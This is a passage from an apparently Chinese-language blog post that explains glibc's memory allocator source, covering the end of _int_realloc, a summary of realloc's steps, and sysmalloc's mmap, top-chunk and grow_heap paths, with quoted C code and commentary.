&#123;</span><br><span class="line">            <span class="comment">//这里是正常进行扩展的部分，也就是malloc一个申请大小的chunk，拷贝数据之后释放原有的chunk</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Unroll copy of &lt;= 36 bytes (72 if 8byte sizes)</span></span><br><span class="line"><span class="comment">                 We know that contents have an odd number of</span></span><br><span class="line"><span class="comment">                 INTERNAL_SIZE_T-sized words; minimally 3.</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line"></span><br><span class="line">            copysize = oldsize - SIZE_SZ;</span><br><span class="line">            s = (INTERNAL_SIZE_T *) (chunk2mem (oldp));</span><br><span class="line">            d = (INTERNAL_SIZE_T *) (newmem);</span><br><span class="line">            ncopies = copysize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">            assert (ncopies &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ncopies &gt; <span class="number">9</span>)</span><br><span class="line">                <span class="built_in">memcpy</span> (d, s, copysize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                *(d + <span class="number">0</span>) = *(s + <span class="number">0</span>);</span><br><span class="line">                *(d + <span class="number">1</span>) = *(s + <span class="number">1</span>);</span><br><span class="line">                *(d + <span class="number">2</span>) = *(s + <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (ncopies &gt; <span class="number">4</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    *(d + <span class="number">3</span>) = *(s + <span class="number">3</span>);</span><br><span class="line">                    *(d + <span class="number">4</span>) = *(s + <span class="number">4</span>);</span><br><span class="line">                    <span class="keyword">if</span> (ncopies &gt; <span class="number">6</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        *(d + <span class="number">5</span>) = *(s + <span class="number">5</span>);</span><br><span class="line">                        *(d + <span class="number">6</span>) = *(s + <span class="number">6</span>);</span><br><span class="line">                        <span class="keyword">if</span> (ncopies &gt; <span class="number">8</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            *(d + <span class="number">7</span>) = *(s + <span class="number">7</span>);</span><br><span class="line">                            *(d + <span class="number">8</span>) = *(s + <span class="number">8</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _int_free (av, oldp, <span class="number">1</span>);</span><br><span class="line">            check_inuse_chunk (av, newp);</span><br><span class="line">            <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断如果新分配的大小小于原有的大小的，暂时将新分配的大小设置为原有的大小，之后在进行分拆。如果新分配的大小大于原有的大小，先使用<code>malloc</code>分配一块用户申请的大小的<code>chunk</code>。</p><ul><li>若该<code>chunk</code>与原有的<code>chunk</code>相邻，则直接将新的<code>chunk</code>指针设置为原有的<code>chunk</code>指针，同时更新<code>size</code>。（这里是为了避免拷贝造成的时间消耗）。</li><li>否则判断需要拷贝的字节的大小，如果需要拷贝的字节数较大则直接调用<code>memcpy</code>进行拷贝，否则手工拷贝</li><li>拷贝数据完成之后，将原有的<code>chunk</code>释放</li></ul><p>经过这里我们获得的<code>chunk</code>一定大于或者等于原有的<code>chunk</code>，因此需要进行分拆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>*</span><br><span class="line">_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">     INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义和安全性检查</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (oldsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* already big enough; split below */</span></span><br><span class="line">      newp = oldp;</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//分配新的chunk，若与原有的chunk相邻，则合并</span></span><br><span class="line">        <span class="comment">//否则拷贝数据，释放原有的chunk</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If possible, free extra space in old or extended chunk */</span></span><br><span class="line">    <span class="comment">//拆分并释放多余的chunk空间</span></span><br><span class="line">    assert ((<span class="type">unsigned</span> <span class="type">long</span>) (newsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)   <span class="comment">/* not enough extra to split off */</span></span><br><span class="line">    &#123;</span><br><span class="line">        set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>   <span class="comment">/* split remainder */</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (newp, nb);</span><br><span class="line">        set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">/* Mark remainder as inuse so free() won&#x27;t complain */</span></span><br><span class="line">        set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">        _int_free (av, remainder, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_inuse_chunk (av, newp);</span><br><span class="line">    <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试进行拆分，这里需要注意的是拆分之后的<code>chunk</code>的大小需要满足组成一个<code>chunk</code>的条件。如果不能拆分则返回当前的<code>chunk</code>，如果可以进行拆分则释放拆分之后的<code>chunk</code>，返回合适的<code>chunk</code>。</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ol><li>首先判断<code>realloc_hook</code>是否设置，如果设置则跳转到<code>realloc_hook</code>位置，否则进入下一步</li><li>如果该<code>chunk</code>是<code>mmap</code>分配的，则通过<code>malloc,copy,free</code>的操作进行申请空间，拷贝数据，释放原有的<code>chunk</code>。这里需要注意的是如果设置了<code>HAVE_MREMAP</code>，则调用<code>mremap_chunk</code>函数进行分配<code>chunk</code>(该函数之后在进行分析)。如果不是则进入下一步</li><li>得到一个大于等于原有<code>chunk</code>大小的新<code>chunk</code>。进入下一步<ol><li>如果新申请的大小小于原有的<code>chunk</code>，则返回原有的<code>chunk</code>，否则进入下一步</li><li>根据用户申请的大小，<code>malloc</code>一个新的<code>chunk</code>，如果该<code>chunk</code>位于原有的<code>chunk</code>之后，则合并<code>chunk</code>，返回原有的<code>chunk</code>指针（这里是为了避免拷贝耗时）否则进入下一步</li><li>根据需要拷贝的数据大小选择不同的拷贝方式，释放原有的<code>chunk</code>，返回新分配的<code>chunk</code>指针。</li></ol></li><li>尝试进行拆分，如果拆分成功则将拆分之后的<code>chunk</code>释放，否则返回该<code>chunk</code></li></ol><h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p><code>sysmalloc (INTERNAL_SIZE_T nb, mstate av)</code>，函数用来扩展或者更改<code>top chunk</code>，从系统申请内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">     the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">     allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">     rather than expanding top.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">        || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">        try_mmap:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">         is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">         is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">         need for further alignments unless we have have high alignment.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">        <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            size = ALIGN_UP (nb + SIZE_SZ, pagesize);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">        tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">            mm = (<span class="type">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mm != MAP_FAILED)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">                 in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">                 returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">                 and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">                 address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">                     MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">                     aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">                    assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                    front_misalign = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                    p = (mchunkptr) (mm + correction);</span><br><span class="line">                    p-&gt;prev_size = correction;</span><br><span class="line">                    set_head (p, (size - correction) | IS_MMAPPED);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    p = (mchunkptr) mm;</span><br><span class="line">                    set_head (p, size | IS_MMAPPED);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">                <span class="type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> sum;</span><br><span class="line">                sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">                <span class="type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">                check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当前的分配区为空，或者是需要分配的大小大于<code>mmap</code>分配的阈值且分配完毕之后还存在可以分配的内存(通过<code>n_mmaps&lt;n_mmaps_max</code>进行判断)。就采用<code>mmap</code>分配内存。</p><p>由于通过<code>mmap</code>分配的内存不存在<code>chunk</code>上下文之间的结构，需要加上表示<code>prev_size</code>的字段。因此需要重新计算需要分配的内存的大小，并进行对齐。接着调用<code>MMAP</code>函数进行分配一块可读可写的内存。这里的<code>MMAP</code>实际上就是调用的<code>__mmap</code>函数。之后在进行分析。</p><p>如果<code>MMAP</code>函数调用成功则进行相关的标志位设置，更新<code>malloc_par</code>中表示内存分配的<code>chunk</code>数量和内存大小的字段。</p><p>如果<code>mmap</code>失败，且当前分配区不可用，则返回空指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">        || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//处理可以使用mmap的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize (old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对<code>top chunk</code>的大小和标志位进行检查，如果<code>top chunk</code>的大小足以分配用户申请的大小的<code>chunk</code>则返回错误。否则判断当前的分配区是否为主分配区（因为主分配区可以直接使用<code>sbrk</code>从系统分配内存）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">        || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//处理可以使用mmap的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// top chunk 参数和大小检查</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">        heap_info *old_heap, *heap;</span><br><span class="line">        <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">        old_heap = heap_for_ptr (old_top);</span><br><span class="line">        old_heap_size = old_heap-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            set_head (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">                      | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先根据<code>top chunk</code>的指针取出该堆的<code>heap info</code>结构体</p><blockquote><p>由于非主线程的堆都是按照<code>HEAP_MAX_SIZE</code>进行对齐分配的，因此我们将<code>top chunk</code>的地址保留前<code>n</code>位即可以获取<code>heap_info</code>结构体的起始地址</p></blockquote><p>接着调用<code>grow_heap</code>函数尝试向<code>top chunk</code>的高地址处增加相应的大小。</p><h3 id="grow-heap"><a href="#grow-heap" class="headerlink" title="grow_heap"></a>grow_heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Grow a heap.  size is automatically rounded up to a</span></span><br><span class="line"><span class="comment">   multiple of the page size. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">grow_heap</span> <span class="params">(heap_info *h, <span class="type">long</span> diff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">    <span class="type">long</span> new_size;</span><br><span class="line"></span><br><span class="line">    diff = ALIGN_UP (diff, pagesize);</span><br><span class="line">    new_size = (<span class="type">long</span>) h-&gt;size + diff;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) new_size &gt; (<span class="type">unsigned</span> <span class="type">long</span>) HEAP_MAX_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) new_size &gt; h-&gt;mprotect_size)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__mprotect ((<span class="type">char</span> *) h + h-&gt;mprotect_size,</span><br><span class="line">                        (<span class="type">unsigned</span> <span class="type">long</span>) new_size - h-&gt;mprotect_size,</span><br><span class="line">                        PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">        h-&gt;mprotect_size = new_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h-&gt;size = new_size;</span><br><span class="line">    LIBC_PROBE (memory_heap_more, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数对于需要增加的大小采用<code>pagesize</code>进行对齐，并验证增加之后的<code>heap</code>是否超过了单线程所允许的最大的<code>heap</code>。通过验证之后，首先修改了新<code>heap</code>所在内存的保护标志，接着及重新赋值<code>size</code>即达到了增加<code>heap</code>的效果。</p><p>如果<code>grop heap</code>成功则修改<code>malloc_state</code>即表示当前分配区的结构体中表示内存分配总量的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">        || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//处理可以使用mmap的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// top chunk 参数和大小检查</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//参数获取</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">            